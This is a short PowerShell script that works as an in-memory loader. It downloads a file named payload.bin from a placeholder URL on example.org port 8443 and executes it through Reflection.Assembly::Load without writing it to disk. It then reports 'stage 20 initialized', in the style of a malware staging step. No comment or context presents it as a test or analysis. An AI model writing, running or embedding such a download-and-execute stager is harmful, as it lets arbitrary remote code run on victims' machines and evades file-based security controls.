[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://example.org:8443/payload.bin'
)
$PayloadBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl)
[Reflection.Assembly]::Load($PayloadBytes)
Write-Output "stage 20 initialized"
